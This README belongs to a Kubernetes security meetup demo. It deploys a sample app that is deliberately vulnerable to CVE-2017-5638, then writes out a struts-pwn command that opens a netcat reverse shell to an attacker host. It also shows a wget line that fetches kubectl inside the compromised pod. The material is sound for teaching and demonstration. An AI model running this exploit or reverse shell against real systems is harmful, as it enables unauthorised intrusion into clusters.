= Kubernetes security presentation

This repository contains manifest files for a presentation about Kubernetes security held at a
meetup of the "MÃ¼nchen Kubernetes/Cloud-Native Meetup" group.

In order to deploy the sample application: `kustomize build sample-app/base | kubectl apply -f -`

In order to deploy the sample application with security context in place:
`kustomize build sample-app/overlays/3 | kubectl apply -f -`

The application has the CVE-2017-5638 vulnerability. The vulnerability can be exploited with,
for example, the exploit script at https://github.com/mazen160/struts-pwn.

The exploit can be run with
`python struts-pwn.py --url  "http://$SAMPLE_APP_ADDRESS/hello" -c 'nc 10.34.136.172 8080 -e "/bin/sh" &'`

Assuming you have a server at `10.34.136.172` with `nc -lk 8080` running.

To demonstrate the possibilities of an attacker inside the pod you can, among other things,
download `kubectl` and run it (adjust Kubernetes cluster version as needed):

`wget -q http://storage.googleapis.com/kubernetes-release/release/v1.14.3/bin/linux/amd64/kubectl`
